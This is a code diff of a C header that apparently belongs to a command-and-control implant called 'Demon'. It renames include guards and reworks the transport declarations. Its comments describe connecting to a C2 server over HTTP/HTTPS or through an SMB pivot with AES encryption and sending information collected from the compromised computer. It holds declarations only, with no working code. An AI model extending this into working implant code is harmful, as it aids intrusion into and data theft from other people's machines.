@@ -1,20 +1,17 @@
-#ifndef ICECUBE_INTERNET_H
-#define ICECUBE_INTERNET_H
-
-#include <Demon.h>
+#ifndef DEMON_INTERNET_H
+#define DEMON_INTERNET_H
 
 #include <Core/Package.h>
-#include <winhttp.h>
+#include <Core/TransportHttp.h>
+#include <Core/TransportSmb.h>
 
 /*!
- * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption
+ * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption or
+ * Initializes a connection to the parent pivot over SMB + using AES encryption
  * and send the collected user/computer info about the compromised Computer
- * @param  Package pointer to use.
- *         NULL == send it directly using DEMON_INIT (99)
- *         If specified it's going to add the data to the specified Package
  * @return Return if functions ran successful
  */
-BOOL TransportInit( PPACKAGE Package );
+BOOL TransportInit();
 
 /*!
  * Send our specified data + encrypt it with random key
@@ -23,15 +20,5 @@ BOOL TransportInit( PPACKAGE Package );
  * @return Return if functions ran successful
  */
 BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize );
-
-#ifdef TRANSPORT_SMB
-/*!
- * Receive data from our connected parent agent.
- * @param Data Data buffer to save our data received from the server
- * @param Size Size of received data
- * @return Return if functions ran successful
- */
-PVOID TransportRecv( PSIZE_T Size );
-#endif
 
 #endif
